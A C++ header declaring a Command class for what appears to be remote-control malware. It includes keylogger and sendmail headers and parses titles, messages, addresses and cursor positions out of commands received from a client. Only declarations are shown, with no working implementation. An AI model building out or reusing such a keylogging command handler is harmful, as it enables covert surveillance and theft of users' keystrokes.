#pragma once
#define DEBUG true

#include "keylogger.h"
#include "client.h"
#include "sendmail.h"
#include <iostream> 
#include <string>
#include <windows.h> 
#include <thread>

class Command
{
private:
	Client * _client;
	std::string _cmd;
	int getSeparation(std::string cmd, std::string code);
	std::string getTitle(std::string cmd);
	std::string getMessage(std::string cmd, bool address);
	std::string getAddress(std::string cmd);
	int getCursorX(std::string cmd);
	int getCursorY(std::string cmd);
	
public:
	
	Command(std::string cmd, Client * client) : _client(client)
	{
		if (cmd.length() >= 2)
			this->_cmd = cmd;
		else
		{
			if (DEBUG)
				std::cout << "Command is invalid!\n";
		}
	}
	void execCommand();
	
};